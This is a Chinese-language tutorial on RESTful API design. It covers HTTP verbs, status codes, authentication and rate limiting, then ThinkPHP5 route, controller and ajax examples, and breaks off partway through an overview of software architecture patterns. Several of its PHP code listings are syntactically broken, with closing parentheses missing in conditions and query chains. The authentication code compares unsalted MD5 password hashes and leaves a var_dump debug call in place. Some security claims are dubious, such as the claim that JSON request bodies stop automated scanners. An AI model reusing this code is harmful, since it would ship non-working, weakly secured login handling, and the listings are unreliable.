Restful Api主要的功能无外乎CURD(create,update,read,delete),对应Restful Api的方法为:GET POST PUT DELETE四个常用的方法
用HTTP协议里的动词来实现资源的添加,修改,删除等操作,即通过HTTP动词来实现资源的状态转换,7个HTTP方法:GET/POST/PUT/DELETE/PATCH/HEAD/OPTIONS
在使用PUT和POST请求的时候,具体的数据将会包含在请求体中
保证HEAD和GET方法是安全的,不会对资源状态有所改变

常用的HTTP动词(括号里是对应的SQL命令)
GET(SELECT)     请求获取request-uri所标识的资源
POST(CREATE)    在request-uri所标识的资源后附加新的数据,用来新建资源,也可以用于更新资源
PUT(UPDATE)     请求服务器存储一个资源,并用request-uri作为其标识;更新资源并返回资源的全部信息
DELETE(DELETE)  请求服务器删除由request-uri所标识的资源
HEAD            请求获取由request-uri所标识的资源的响应消息报头
OPTIONS         请求查询服务器的性能或者查询与资源相关的选项和需求
PATCH(UPDATE)   在服务器更新资源(客户端提供改变的属性)

传统的请求模式和REST模式的请求模式区别:
作用                传统模式                  REST模式
列举出所有的用户     GET /users/list           GET /users
列出ID为1的用户信息  GET /users/show/id/1      GET /users/1
插入一个新的用户     POST /users/add           POST /users
更新ID为1的用户信息  POST /users/update/id/1   PUT /users/1
删除ID为1的用户      POST /users/delete/id/1   DELETE /users/1

BAD
/getProducts
/listOrders
/retrieveClientByOrder?orderId=1
GET http://api.qc.com/v1/deleteFriend
GET /deleteProduct?id=1

GOOD
GET http://api.qc.com/v1/products           // return the list of all products
GET http://api.qc.com/v1/products/4         // retrieve product #5
POST http://api.qc.com/v1/products          // add a product to the collection
POST http://api.qc.com/v1/employee/4        // add a product #4
PUT http://api.qc.com/v1/products/4         // update product #4
PUT http://api.qc.com/v1/products           // update product
DELETE http://api.qc.com/v1/products        // delete a product,在http parameter指定好友id
DELETE http://api.qc.com/v1/products/4      // delete a product #4

有些浏览器不支持put和delete,会自动将put和delete请求转化为get和post,是因为html4官方在表单中仅支持get和post方法,忽略了Put和Delete以及其他Http方法,容器找不到对应的处理器get方法或post方法报错
尽管在html5和一些新的浏览器支持所有的http方法,但不可能所有用户都使用最新的浏览器
因此为了使用put和delete方法,需要以post发送请求,在表单中使用隐藏域发送真正的请求

解决方案
1.前端通过ajax发送
2.通过在form表单中使用隐藏域在服务器端配置过滤器来发送真实请求

如果某些动作是HTTP动词表示不了的,应该把动作做成一种资源。比如网上汇款,从账户1向账户2汇款500元,错误的URI是:
POST /accounts/1/transfer/500/to/2
正确的写法是把动词transfer改成名词transaction,资源不能是动词,但是可以是一种服务:
POST /transaction HTTP/1.1
Host: 127.0.0.1
from=1&to=2&amount=500.00

4、Server和Client之间传递某资源的一个表现形式,比如用JSON,XML传输文本或用JPG,WebP传输图片等,还可以压缩HTTP传输时的数据

5、使用正确的HTTP状态码Status Code传递Server的访问状态信息,帮助API使用者对不同的响应做出相应处理
在返回结果用明确易懂的文本,注意返回的错误是要给人看的,避免用1001这种错误信息,而且适当地加入注释
200 OK - [GET]                              =>服务器成功返回用户请求的数据,该操作是幂等的(Idempotent)。
201 CREATED - [POST/PUT/PATCH]              =>用户新建或修改数据成功。
202 Accepted - [*]                          =>表示一个请求已经进入后台排队(异步任务)
204 NO CONTENT - [DELETE]                  =>用户删除数据成功,没有返回主体信息。
304 Not Modified                          =>当使用HTTP缓存头信息时使用304
400 INVALID REQUEST - [POST/PUT/PATCH]  =>用户的请求有错误(如无法解析请求体),服务器没进行新建或修改数据的操作,该操作幂等
401 Unauthorized - [*]             =>表示用户没有权限(令牌、用户名、密码错误),若浏览器使用API也可用来触发弹出一次认证请求
403 Forbidden - [*]                   =>表示用户得到授权(与401错误相对),但是访问是被禁止的,如无权限进行操作
404 NOT FOUND - [*]                     =>用户发出的请求针对的是不存在的资源记录,服务器没有进行操作,该操作是幂等的
405 Method Not Allowed(方法被禁止)       =>当一个对认证用户禁止的HTTP方法被请求时
406 Not Acceptable - [GET]                =>用户请求的格式不可得(比如用户请求JSON格式,但是只有XML格式)
410 Gone -[GET]                        =>用户请求的资源被永久删除,且不会再得到的,当访问老版本API时作为一个通用响应很有用
422 Unprocesable entity - [POST/PUT/PATCH]  =>当创建一个对象时,发生一个验证错误
429 Too Many Requests(请求过多)             =>当请求由于访问速率限制而被拒绝时
500 INTERNAL SERVER ERROR - [*]             =>服务器发生错误,用户将无法判断发出的请求是否成功

6、错误处理(Error handling)
如果状态码是4xx,就应该向用户返回出错信息的响应体。一般来说返回的信息中将error作为键名,出错信息作为键值即可
{ error: "Invalid API key" }

对于非法的,导致系统出错的等请求都进行记录,一些重要的操作如登录,注册等都通过日志接口输出展示。有一个统一的出错接口,对于400系列和500系列的错误都有相应的错误码和相关消息提示,如401:未授权;403:已经鉴权但没有相应权限。
不识别的url:   {"result":"Invalid URL!"}
错误的请求参数:{"result":"json format error"}
不允许的方法:  {"result":"Method Not Allowed"}
非法参数等

上面所说的都是单状态码,同时还有多状态码,表示部分成功,部分字符非法等
HTTP/1.1  207  Multi-Status
Content-Type:  application/json;  charset="UTF-8"
Content-Length:  XXXX
{
  "OPT_STATUS":  207
  "DATA":  {
    "IP_ADDRESS":  [{
      "INTERFACE":  "eth0",
      "IP_LIST":[{
        "IP":  "192.168.1.1",
        "MASK":  "255.255.0.0",
        "MULTI_STATUS":  200,
        "MULTI_RESULT":  "created successfully"
      },{
        "IP":  "192.167.1.1",
        "MASK":  "255.255.0.0",
        "MULTI_STATUS":  409,
        "MULTI_RESULT":  "invalid parameter"
      }]
    }]
},

7、URL过滤
在进入逻辑处理之前加入对URL的参数过滤
/site/{num}/policy
限定num位置为整数等,如果不是参数则直接返回非法参数,设定一个url清单,不在不在url清单中的请求直接拒绝,这样能防止开发中的api泄露。rest api接口一般会用到GET,POST,PUT,DELETE,未实现的方法则直接返回方法不允许,对于POST,PUT方法的数据采用json格式,并且在进入逻辑前验证是否json,不合法返回json格式错误

8、过滤信息(Filtering)
进行分页pagination或加入限制limit,HTTP协议支持分页Pagination操作,在Header中使用Link即可。
如果记录数量很多,服务器不可能都将它们返回给用户,API应该提供参数,过滤返回结果
?limit=10:指定返回记录的数量
?offset=10:指定返回记录的开始位置。
?page=2&per_page=100:指定第几页,以及每页的记录数。
?sortby=name&order=asc:指定返回结果按照哪个属性排序,以及排序顺序。
?animal_type_id=1:指定筛选条件
参数的设计允许存在冗余,即允许API路径和URL参数偶尔有重复。比如GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。

curl 'https://api.github.com/user/repos?page=2&per_page=100'

9、返回结果
针对不同操作,服务器向用户返回的结果应该符合以下规范
GET /collection              返回资源对象的列表(数组)
GET /collection/resource     返回单个资源对象
POST /collection             返回新生成的资源对象
PUT /collection/resource     返回完整的资源对象
PATCH /collection/resource   返回资源被修改的属性
DELETE /collection/resource  返回一个空文档空响应体,204

10、Hypermedia API
Hypermedia是应用程序状态的引擎,资源表示通过超链接互联,API把文档嵌入自身当中
RESTful API最好做到Hypermedia,即返回结果中提供链接,连向其他API方法,使得用户不查文档,也知道下一步应该做什么。
超媒体API的目标之一是让客户端在不重新编写代码的前提下动态调整所用的端点
比如当用户向api.example.com的根目录发出请求,会得到这样一个文档。
{"link": {
  "rel":   "collection https://www.example.com/zoos",
  "href":  "https://api.example.com/zoos",
  "title": "List of zoos",
  "type":  "application/vnd.yourformat+json"
}}
上面代码表示,用户读取文档中link属性就知道下一步该调用什么API了。rel表示这个API与当前网址的关系(collection关系,并给出该collection的网址),href表示API的路径,title表示API的标题,type表示返回类型。
Hypermedia API的设计被称为HATEOAS。Github的API就是这种设计,访问api.github.com会得到一个所有可用API的网址列表。

{
  "current_user_url": "https://api.github.com/user",
  "authorizations_url": "https://api.github.com/authorizations",
  // ...
}
从上面可以看到,如果想获取当前用户的信息,应该去访问api.github.com/user,然后就得到了下面结果。
{
  "message": "Requires authentication",
  "documentation_url": "https://developer.github.com/v3"
}
上面代码表示,服务器给出了提示信息以及文档的网址。

11、身份认证
身份认证包含很多种,有HTTP Basic,HTTP Digest,API KEY,Oauth,JWT等方式

REST是无状态的传输,所以每一次请求都得带上身份认证信息,身份认证的方式有很多种,第一种http basic方式在客户端要求简单,在服务端实现也非常简单,只需简单配置apache等web服务器即可实现,所以对于简单的服务来说还是挺方便的,但这种方式安全性较低,就是简单的将用户名和密码base64编码放到header中。
base64编码前:Basic admin:admin
base64编码后:Basic YWRtaW46YWRtaW4=
放到Header中:Authorization:  Basic YWRtaW46YWRtaW4=
正是因为是简单的base64编码存储,在这种方式下一定使用ssl,不然就是裸奔了。 在某些产品中也是基于这种类似方式,只是没有使用apache的basic机制,而是自己写了认证框架,原理还是一样的,在一次请求中base64解码Authorization字段,再和认证信息做校验。显然这种方式有问题,认证信息相当于明文传输,另外也没有防暴力破解功能

API Key就是经过用户身份认证之后服务端给客户端分配一个API Key,类似:http://example.com/api?key=dfkaj134
client端向服务端注册,服务端给客户端发送响应的api_key及security_key,注意保存不要泄露,然后客户端根据api_key,secrity_key,timestrap,rest_uri采用hmacsha256算法得到一个hash值sign,构造url发送给服务端。 服务端收到该请求后,首先验证api_key是否存在,存在则获取该api_key的security_key,接着验证timestrap是否超过时间限制,可依据系统而定,这样就防止了部分重放攻击,rest_api是从url获取的为/rest/v1/interface/eth0,最后计算sign值,完之后和url中的sign值做校验,这样的设计就防止了数据被篡改,通过这种API Key的设计方式加了时间戳防止了部分重放,加了校验,防止了数据被篡改,同时避免了传输用户名和密码,当然了也会有一定的开销

Oauth2.0协议适用于为外部应用授权访问本站资源的情况。其中的加密机制与HTTP Digest身份认证相比,安全性更高。使用和配置都比较复杂

JWT是JSON Web Token,用于发送可通过数字签名和认证的东西,它包含一个紧凑的,URL安全的JSON对象,服务端可通过解析该值来验证是否有操作权限,是否过期等安全性检查。由于其紧凑的特点,可放在url中或HTTP Authorization头中
header  base64enc({"alg":"HS256","type":"JWT"})
payload base64enc({"iss":"toptal.com","exp":"1426420800","company":"Toptal","awesome":true})
signature HMACSHA256(base64enc(header)+"."+base64enc(payload),secretKey)

12、授权
身份认证之后就是授权,根据不同的身份,授予不同的访问权限。比如admin用户,普通用户,auditor用户都是不同的身份
$roles  =  array(
    'ADMIN'=>array(
      'permit'=>array('/^((\/system\/(clouds|device)$/'), // 允许访问哪些URL的正则表达式
      'deny'=>array('/^(\/system\/audit)$/')  // 禁止访问哪些URL的正则表达式
    ),

    'AUDIT'=>array(
      'permit'=>array('/^(\/system\/audit)$/'),//允许访问的URL正则表达式
      'deny'=>array('/^((\/system\/(clouds|device).*)$/')
    )
);
上述是垂直权限的处理,如果遇到了平行权限的问题,如用户A获取用户B的身份信息或者更改其他用户信息,对于这些敏感数据接口都需要加上对用户的判断,这一步一般都在具体的逻辑实现中实现

13、请求速率限制
根据api_key或用户来判断某段时间的请求次数,将该数据更新到内存数据库(redis,memcached),达到最大数即不接受该用户的请求,同时这样还可以利用到内存数据库key在特定时间自动过期的特性。在php中可以使用APC,AlternativePHP Cache(APC) 是一个开放自由的PHP opcode缓存,它的目标是提供一个自由、 开放和健全的框架用于缓存和优化PHP的中间代码。在返回时设置X-Rate-Limit-Reset:当前时间段剩余秒数,APC的示例代码如下:

Route::filter('api.limit', function(){
  $key = sprintf('api:%s', Auth::user()->api_key);
  Cache::add($key,  0,  60);                            // Create the key if it doesn't exist
  $count = Cache::increment($key);                      // Increment by 1
  if ($count > Config::get('api.requests_per_hour'){    // Fail if hourly requests exceeded
    App::abort(403, 'Hourly request limit exceeded');
  }
});

14、安全建议
尽量使用SSL,在传输过程中采用SSL保证传输安全,尽量采用HTTPS协议进行接口请求,加上一个key做一次hash放在最后即可

重要功能加密传输
第一步推荐SSL加密传输,同时对于系统中重要的功能做加密传输,如证书,一些数据,配置的备份功能,同时还得确保具备相应的权限,这一步会在授权中涉及

重要ID不透明处理
在系统一些敏感功能上,比如/user/1123 可获取id=1123用户的信息,为了防止字典遍历攻击,可对id进行url62或者uuid处理,这样处理的id是唯一的,并且还是字符安全的

请求数据,对于POST,DELETE方法中的数据都采用json格式,使用json格式目前能防止扫描器自动扫描

返回数据统一编码格式,统一返回类型,如Content-Type: application/json; charset="UTF-8″

在逻辑实现中,json解码之后进行参数验证或转义操作,第一步json格式验证,第二步具体参数验证基本上能防止大部分的注入问题了。

存储安全
重要信息加密存储,如认证信息hash保存

考虑到国情,HTTPS在无线网络里不稳定,可以使用Application Level的加密手段把整个HTTP的payload加密。
可以用手机连上电脑的共享Wi-Fi,然后用Charles监听微信的网络请求(发照片或者刷朋友圈)。

【 REST请求测试 】
(1)通过Postman来测试接口,给Chrome浏览器安装一个postman扩展,访问下面地址获取官方扩展:https://www.getpostman.com/
(2)cURL调试
(3)tinkphp5.0 REST请求伪装
除了使用Postman之外,可以通过一个post表单来伪装REST的请求类型。
首先创建一个普通的post表单,把请求参数都作为表单的项目,并且在表单最后添加一个隐藏域_method

表单模拟了删除博客的请求接口
</pre><textarea rows="4">
<form method="post" class="form" action="/blogs/1">
  <input type="submit" class="btn" value=" 删除 ">
  <input type="hidden" name="_method" value="DELETE" />
</form>

</textarea><pre>
API调试
可以使用ThinkPHP5.0的Trace调试中的Socket调试功能来解决API开发的调试问题

</pre>

<h4>实例</h4><pre>
项目需求:用户注册登录和文章管理

确认设计要素
1、资源路径:两种资源
/users
/articles

2、http动词:GET、POST、PUT、DELETE

3、过滤信息:文章的分页筛选

4、状态码
200 创建成功
404 文章不存在
422 创建资源时缺少参数
403 无权限进行操作,如删除

5、错误处理:输出json格式错误信息

6、返回结果
返回文章列表则输出json数组或对象

数据库设计
用户表:ID、用户名、用户密码、注册时间
文章表:文章id、标题、内容、发表时间、文章所属用户id

用户登录注册return用户信息


</pre>

<h3>其他架构</h3><pre>
SOAP WebService 一种跨编程语言和操作系统平台的远程调用技术(参考php soap webserver)
webservice也是通过HTTP协议发送请求和接收结果时采用xml格式式封装,并增加一些特定的http消息头,这些特定的http消息头和xml内容格式就是soap协议

SOAP偏向于面向活动,有严格的规范和标准,包括安全,事务等各个方面的内容,同时SOAP强调操作方法和操作对象的分离,有WSDL文件规范和XSD文件分别对其定义。而REST强调面向资源,只要我们要操作的对象可以抽象为资源即可以使用REST架构风格

</pre>

<h3>thinkphp5 restful</h3><pre>
route.php
use think\Route;
Route::resource(':version/news','api/:version.news');

// Route::get('/',function(){ return 'Hello,world!'; });
Route::get('news/:id','api/News/read');        // 查询
Route::post('news','api/News/add');            // 新增
Route::put('news/:id','api/News/update');      // 修改
Route::delete('news/:id','api/News/delete');   // 删除
//Route::any('new/:id','News/read');           // 所有请求都支持的路由规则

</pre>

<h4>示例</h4><pre>
以一个用户信息读取的接口为例,包含两个版本V1和V2,v2版本的接口包括用户的档案信息,统一使用json格式数据输出到客户端
在application目录下面创建api模块目录,并创建controller和model子目录,因为api接口无需视图,所以不需要创建view目录
api版本号可以在请求头、参数、URL路由参数中传入

第一种:URL路由传入方式(推荐)
在route.php路由文件中配置
return [
    // api版本路由
    'api/:version/:controller'=>'api/:version.:controller/index',// 省略方法名时
    'api/:version/:controller/:function'=>'api/:version.:controller/:function'// 有方法名时

];

不同版本的URL访问地址为:
http://tp5.com/api/v1/user/10
http://tp5.com/api/v2/user/10
版本号中不能包含.符号。

第二种:请求头传入方式
在route.php路由文件中配置
$v = request()->header('version') ? : "v1";
return [
    //api版本控制
    'api/:controller$'=>['api/'.$v.'.:controller/index',['method' => 'get']],
    'api/:controller/:function$'=>'api/'.$v.'.:controller/:function',

    //资源路由
    '__rest__'=>[
        'api/house'=>['api/'.$v.'.house',['only'=>['index','read','update','delete']]],
        'api/book'=>['api/'.$v.'.book',['only'=>['index','read','save','delete']]],
        'api/book_rent'=>['api/'.$v.'.book_rent',['only'=>['index','read','save']]],
  ]
]


第三种:请求参数传入方式,和请求头方式类似
Router::rule(':version/user/:id', 'api/:version.User/read');

【 控制器实现 】
v1版本控制器(类文件位置为application/api/controller/v1/User.php)代码如下:
namespace app\api\controller\v1;
use app\api\model\User as UserModel;
class User{
    // 获取用户信息
    public function read($id = 0){
        $user = UserModel::get($id);
        if($user) {
            return json($user);
        } else {
            return json(['error' => '用户不存在'], 404);
        }
    }

}

v2版本的控制器(类文件位置为application/api/controller/v2/User.php)代码如下:
namespace app\api\controller\v2;
use app\api\model\User as UserModel;
class User{
    // 获取用户信息
    public function read($id = 0){
        $user = UserModel::get($id, 'profile'); // 关联预查询
        if($user) {
            return json($user);
        } else {
            return json(['error' => '用户不存在'], 404);
        }
    }
}

【 使用ajax调用 】
// read方法调用:
$.ajax({
    type:'get',
    async:true,
    url:'{$Request.root.true}/api/2',
    success:function(response){
        console.log(JSON.stringify(response);
    }
})

// edit方法调用:
$.ajax({
    type:'get',
    async:true,
    url:'{$Request.root.true}/api/2/edit',
    data:{"name": "Xy.Zm", "sex": "man" },
    success:function(response){
        console.log(JSON.stringify(response);
    }
})

// save方法调用如下:
$.ajax({
    type:'post',
    async:true,
    url:'{$Request.root.true}/api/',
    data:{"name": "Xy.Zm", "sex": "man" },
    success:function(response){
        console.log(JSON.stringify(response);
    }
})

// update方法调用如下:
$.ajax({
    type:'put',
    async:true,
    url:'{$Request.root.true}/api/2',
    data:{"name": "Xy.Zm", "sex": "man" },
    success:function(response){
        console.log(JSON.stringify(response);
    }
})

// delete方法调用如下:
$.ajax({
    type:'delete',
    async:true,
    url:'{$Request.root.true}/api/2',
    success:function(response){
        console.log(JSON.stringify(response);
    }
})

</pre>

<h4>thinkphp5.0 restful api</h4><textarea>/**
cmd> php think make:controller api/v1/Blog  // 命令行自动生成资源控制器Blog

DROP TABLE IF EXISTS `think_blog`;
CREATE TABLE IF NOT EXISTS `think_blog`(
  `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `name` char(40) NOT NULL DEFAULT '' COMMENT '标识',
  `title` char(80) NOT NULL DEFAULT '' COMMENT '标题',
  `content` text COMMENT '内容',
  `author` int(10) UNSIGNED NOT NULL COMMENT '作者',
  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '记录创建时间',
  `update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '记录更新时间',
  `delete_time` timestamp NULL DEFAULT NULL COMMENT '软删除时间',
  `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '数据状态',
  PRIMARY KEY(`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='博客表';

//分页路由
Route::get(':version/blogs/[:page]/[:size]','api/:version.blog/index',[],['page'=>'\d+', 'size'=>'\d+']);
//资源路由
Route::resource(':version/blogs','api/:version.blog');
//表单发送伪请求路由
Route::get(':version/blogstest','api/:version.blog/test');
 */

// 控制器类 /tp5/application/api/controller/v1//Blog.php
namespace app\api\controller\v1;

use think\Controller;
use think\Request;
use app\api\model\Blog as Blogs;

class Blog extends Controller{
    protected function get_json(){
        $input = file_get_contents('php://input');
        return json_decode($input, true);
    }

    protected $_auth = false;
    protected $_visitor = null;

    protected function auth(){
        if(input('?server.PHP_AUTH_USER') && input('?server.PHP_AUTH_PW'){
            $result = db('think_members')
                    ->where('username', input('server.PHP_AUTH_USER')
                    ->where('password', md5(input('server.PHP_AUTH_PW')
                    ->find();
            if($result){
                $this->_auth = true;
                $this->_visitor = $result['uid'];
            }
        }
        // var_dump(input('server.PHP_AUTH_USER'), input('server.PHP_AUTH_PW'), $this->_auth);
    }

    /**
     * 显示资源列表
     * @return \think\Response
     */
    public function index($page = 1, $size = 10){
        try {
            $blogs = new Blogs;
            $list = $blogs->page($page, $size)->select();
            return json($list);
        } catch(Exception $e) {
            return json(["error"=>$e->getMessage()], 500);
        }
    }

    /**
     * 显示创建资源表单页.
     * @return \think\Response
     */
    public function create(){
        //
    }

    /**
     * 保存新建的资源
     * @param  \think\Request  $request
     * @return \think\Response
     curl -vX POST -d "name=thinkphp&title=new thinkphpTitle&content=new thinkphpContent" http://localhost/tp5/v1/blogs
     curl -u admin:admin -i -X POST -d {\"name\":\"name\",\"title\":\"title\",\"content\":\"content\"} http://localhost/tp5/v1/blogs
     */
    public function save(Request $request){
        $this->auth();
        if(!$this->_auth)
            return json(['error'=>'You must enter a valid username & password'],401,['WWW-Authenticate' => 'Basic realm=\"Authenticate\"']);
        $jsondata = $this->get_json();
        if(is_null($jsondata)  return json('BAD REQUEST', 400);
        $validate = validate('Blog');
        if(!$validate->check($jsondata){
           return json($validate->getError(), 422);
        }
        $jsondata['author'] = $this->_visitor;var_dump($jsondata);
        try {
            $result = Blogs::create($jsondata);
            return json($result, 201);
        } catch(Exception $e) {
            return json(["error"=>$e->getMessage()], 500);
        }
    }

    /**
     * 显示指定的资源
     * @param  int  $id
     * @return \think\Response
     */
    public function read($id){
        try {
            $data = Blogs::get($id);
            return json($data);
        } catch(Exception $e) {
            return json(["error"=>$e->getMessage()], 500);
        }
    }

    /**
     * 显示编辑资源表单页.
     * @param  int  $id
     * @return \think\Response
     */
    public function edit($id){
        //
    }

    /**
     * 保存更新的资源
     * @param  \think\Request  $request
     * @param  int  $id
     * @return \think\Response
     curl -i -X PUT -d {\"content\":\"newcontent\"} http://localhost/tp5/v1/blogs/7
     curl -i -u admin:admin -X PUT -d {\"content\":\"newcontent\"} http://localhost/tp5/v1/blogs/1
     */
    public function update(Request $request, $id){
        $this->auth();
        if(!$this->_auth)
            return json(['error'=>'You must enter a valid username & password'],401,['WWW-Authenticate' => 'Basic realm=\"Authenticate\"']);
        $jsondata = $this->get_json();
        if(is_null($jsondata)  return json('BAD REQUEST', 400);
        $blog = Blogs::get($id);
        if(!$blog) return json(["error"=>"NOT FOUND"], 404);
        if($blog->author !== $this->_visitor) return json(["error"=>"Forbidden"], 403);
        $data = [
            'name'  => isset($jsondata['name']) ? $jsondata['name'] : $blog->name,
            'title' => isset($jsondata['title']) ? $jsondata['title'] : $blog->title,
            'content' => isset($jsondata['content']) ? $jsondata['content'] : $blog->content
        ];
        $validate = validate('Blog');
        if(!$validate->check($data) return json($validate->getError(), 422);
        try {
            $result = Blogs::update($data, ['id'=>$id]);
            return json($result);
        } catch(Exception $e) {
            return json(["error"=>$e->getMessage()], 500);
        }
    }

    /**
     * 删除指定资源
     * @param  int  $id
     * @return \think\Response
     curl -i -u admin:admin -X DELETE http://localhost/tp5/v1/blogs/1
     */
    public function delete($id){
        $this->auth();
        if(!$this->_auth)
            return json(['error'=>'You must enter a valid username & password'],401,['WWW-Authenticate' => 'Basic realm=\"Authenticate\"']);
        if(!request()->isDelete() return json(["error"=>"Method Not Allowed"], 405);
        if(!$id) return json(["error"=>"id required"], 400);
        $blog = Blogs::get($id);
        if(!$blog) return json(["error"=>"NOT FOUND"], 404);
        if($blog->author !== $this->_visitor) return json(["error"=>"Forbidden"], 403);
        try {
            $blog->delete();
            return json([], 204);
        } catch(Exception $e) {
            return json(["error"=>$e->getMessage()], 500);
        }

    }

    public function test(){
        return view();
    }
}

// 模型类 /tp5/application/api/model/Blog.php
namespace app\api\model;
use think\Model;
use traits\model\SoftDelete;

class Blog extends Model{
  use SoftDelete;
  protected $table = 'think_blog';
  protected $deleteTime = 'delete_time';
  protected $autoWriteTimestamp = 'timestamp';
  protected $insert = [
    'status' => 1,
  ];
  protected $field = [
    'id' => 'int',
    'create_time',
    'update_time',
    'name',
    'title',
    'content',
    'author',
    'delete_time',
  ];
}

// 验证器类 /tp5/application/api/validate/Blog.php
namespace app\api\validate;
use think\Validate;
class Blog extends Validate {
    protected $rule = [
      'name' => 'require|max:40',
      'title' =>'require|max:80',
      'content' => 'require',
    ];
    protected $message = [
        'name.require' => 'name is required',
        'name.max' => "name max 40",
        'title.require' => 'title is required',
        'title.max' => "title max 80",
        'content.require' => 'content is required',
    ];
    protected $scene = [
    'save' => ['name','title', 'content'],
    'update' => ['']
  ];
}

//表单伪请求 /tp5/application/api/view/v1/blog/test.html
<form method="post" action="{:url('index')}">
  <p>name:<input type="text" name="name" value="name"></p>
  <p>title:<input type="text" name="title" value="title"></p>
  <p>content:<input type="text" name="content" value="content"></p>
    <input type="hidden" name="_method" value="PUT" />
    <input type="submit" value=" 提交 ">
</form>

</textarea>
</div>

<div id="architecture">
<h2>常见的软件架构模式 software architecture</h2><pre>
架构模式是一个通用的、可重用的解决方案,用于在给定上下文中的软件体系结构中经常出现的问题,与软件设计模式类似,但具有更广泛的范围。

【 分层模式 Layered pattern 】
也称为多层体系架构模式,是最常见的软件架构,也是事实上的标准架构
用来构造可以分解为子任务组的程序,每个子任务都处于一个特定的抽象级别,每个层都为下一个提供更高层次服务。
这种架构将软件分成若干个水平层,每一层都有清晰的角色和分工,不需要知道其他层的细节,层与层之间通过接口通信。

一般信息系统中最常见的是如下所列的4层,用户的请求将依次通过这四层的处理,不能跳过其中任何一层
presenttation layer 表现层,也称为UI层,负责视觉和用户交互
business layer      业务逻辑层
service layer       服务层,提供不同业务逻辑需要的一些通用接口
persistence layer   持久层,提供数据,sql语句放在这一层
database layer      数据库,保存数据

优点
结构简单,容易理解和开发
不同技能的程序员可以分工,负责不同的层,天然适合大多数软件公司的组织架构
每一层都可以独立测试,其他层的接口通过模拟解决

缺点
一旦环境变化,需要代码调整或增加功能时通常比较麻烦和费时
部署比较麻烦,即使只修改一个小地方,往往需要整个软件重新部署,不容易做持续发布
软件升级时可能需要整个服务暂停
扩展性差。用户请求大量增加时必须依次扩展每一层,由于每一层内部是耦合的,扩展会很困难

使用场景:
一般的桌面应用程序
电子商务Web应用程序

【 事件驱动模式 Event-driven pattern 】
事件是状态发生变化时软件发出的通知
事件驱动架构(event-driven architecture)就是通过事件进行通信的软件架构,它分成四个部分:
1、事件队列(event queue):接收事件的入口
2、分发器(event mediator):将不同的事件分发到不同的业务逻辑单元
3、事件通道(event channel):分发器与处理器之间的联系渠道
4、事件处理器(event processor):实现业务逻辑,处理完成后会发出事件,触发下一步操作
对于简单的项目,事件队列、分发器和事件通道,可以合为一体,整个软件就分成事件代理和事件处理器两部分

优点
分布式的异步架构,事件处理器之间高度解耦,软件的扩展性好
适用性广,各种类型的项目都可以用
性能较好,因为事件的异步本质,软件不易产生堵塞
事件处理器可以独立地加载和卸载,容易部署

缺点
涉及异步编程(要考虑远程通信、失去响应等情况),开发相对复杂
难以支持原子性操作,因为事件通过会涉及多个处理器,很难回滚
分布式和异步特性导致这个架构较难测试

使用场景:
安卓开发
通知服务

【 微核架构 microkernel architecture 】
又称为"插件架构"(plug-in architecture),指软件的内核相对较小,主要功能和业务逻辑都通过插件实现。
内核(core)通常只包含系统运行的最小功能,插件则是互相独立的,插件之间的通信应该减少到最低,避免出现互相依赖的问题。

优点
良好的功能延伸性(extensibility),需要什么功能,开发一个插件即可
功能之间是隔离的,插件可以独立的加载和卸载,使得它比较容易部署,
可定制性高,适应不同的开发需要
可以渐进式地开发,逐步增加功能

缺点
扩展性(scalability)差,内核通常是一个独立单元,不容易做成分布式
开发难度相对较高,因为涉及到插件与内核的通信,以及内部的插件登记机制

【 微服务架构 microservices architecture 】
微服务架构是服务导向架构(service-oriented architecture,缩写SOA)的升级。
每一个服务就是一个独立的部署单元(separately deployed unit),这些单元都是分布式的,互相解耦,通过远程通信协议(比如REST、SOAP)联系

微服务架构分成三种实现模式
1、RESTful API模式:服务通过API提供,云服务就属于这一类
2、RESTful应用模式:服务通过传统的网络协议或应用协议提供,背后通常是一个多功能的应用程序,常见于企业内部
3、集中消息模式:采用消息代理(message broker),可以实现消息队列、负载均衡、统一日志和异常处理,缺点是会出现单点失败,消息代理可能要做成集群

优点
扩展性好,各个服务之间低耦合
容易部署,软件从单一可部署单元,被拆成了多个服务,每个服务都是可部署单元
容易开发,每个组件都可以进行持续集成式的开发,可以做到实时部署,不间断地升级
易于测试,可以单独测试每一个服务

缺点
由于强调互相独立和低耦合,服务可能会拆分得很细。这导致系统依赖大量的微服务,变得很凌乱和笨重,性能也会不佳。
一旦服务之间需要通信(即一个服务要用到另一个服务),整个架构就会变得复杂。典型的例子就是一些通用的 Utility 类,一种解决方案是把它们拷贝到每一个服务中去,用冗余换取架构的简单性。
分布式的本质使得这种架构很难实现原子性操作,交易回滚会比较困难。

【 云架构 cloud architecture 】
云结构主要解决扩展性和并发的问题,是最容易扩展的架构。
它的高扩展性,主要原因是没使用中央数据库,而是把数据都复制到内存中,变成可复制的内存数据单元,然后业务处理能力封装成一个个处理单元(prcessing unit)。访问量增加就新建处理单元,访问量减少就关闭处理单元。由于没有中央数据库,所以扩展性的最大瓶颈消失了。由于每个处理单元的数据都在内存里,最好要进行数据持久化。

这个模式主要分成两部分:
1、处理单元(processing unit):实现业务逻辑
2、虚拟中间件(virtualized middleware):负责通信、保持sessions、数据复制、分布式处理、处理单元的部署。

虚拟中间件又包含四个组件
消息中间件(Messaging Grid):管理用户请求和session,当一个请求进来以后,决定分配给哪一个处理单元。
数据中间件(Data Grid):将数据复制到每一个处理单元,即数据同步。保证某个处理单元都得到同样的数据。
处理中间件(Processing Grid):可选,如果一个请求涉及不同类型的处理单元,该中间件负责协调处理单元
部署中间件(Deployment Manager):负责处理单元的启动和关闭,监控负载和响应时间,当负载增加就新启动处理单元,负载减少就关闭处理单元。

优点
高负载,高扩展性
动态部署

缺点
实现复杂,成本较高
主要适合网站类应用,不合适大量数据吞吐的大型数据库应用
较难测试

【 客户端-服务器模式 Client-server pattern 】
这种模式由两部分组成:一个服务器和多个客户端。服务器组件将为多个客户端组件提供服务。客户端从服务器请求服务,服务器为这些客户端提供相关服务,此外服务器持续侦听客户机请求。

很好地建立一组服务,用户可以请求他们的服务。  请求通常在服务器上的单独线程中处理。由于不同的客户端具有不同的表示,进程间通信会导致额外开销。

使用场景:
电子邮件,文件共享和银行等在线应用程序

【 主从设备模式 Master-slave pattern 】
